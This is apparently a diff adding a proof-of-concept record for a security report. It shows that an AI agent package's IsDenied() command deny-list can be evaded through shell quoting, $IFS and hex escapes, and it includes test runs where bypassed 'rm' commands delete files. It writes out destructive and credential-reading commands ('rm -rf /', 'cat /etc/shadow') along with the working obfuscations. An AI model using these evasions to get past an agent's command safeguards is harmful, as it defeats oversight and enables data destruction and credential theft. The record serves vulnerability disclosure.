@@ -1,0 +1,20 @@
+# Output from running IsDenied() directly against the real package
+IsDenied("rm -rf /"                              ) -> denied=true   pattern="rm -rf"
+IsDenied("r''m -rf /"                            ) -> denied=false  pattern=""
+IsDenied("r\"\"m -rf /"                          ) -> denied=false  pattern=""
+IsDenied("'rm' -rf /"                            ) -> denied=false  pattern=""
+IsDenied("rm${IFS}-rf${IFS}/"                    ) -> denied=false  pattern=""
+IsDenied("$'\\x72m' -rf /"                       ) -> denied=false  pattern=""
+IsDenied("sudo rm -rf /"                         ) -> denied=true   pattern="rm -rf"
+IsDenied("su''do rm -rf /"                       ) -> denied=true   pattern="rm -rf"  # only caught via 'rm -rf' substring, not 'sudo '
+IsDenied("cat /etc/shadow"                       ) -> denied=true   pattern="/etc/shadow"
+IsDenied("cat /etc/sha''dow"                     ) -> denied=false  pattern=""
+IsDenied("cat /etc/sh\"\"adow"                   ) -> denied=false  pattern=""
+
+# Bash semantic test - actual file deletion via bypass strings
+# /tmp/yolo-target contained victim1, victim2, victim3
+bash -c "r''m /tmp/yolo-target/victim1"    -> victim1 deleted
+bash -c 'r""m /tmp/yolo-target/victim2'    -> victim2 deleted
+bash -c "$'\\x72m' /tmp/yolo-target/victim3" -> victim3 deleted
+
+Both halves of the exploit are verified on Darwin 25.3.0 with GNU bash default shell and the real Ollama main branch agent package.
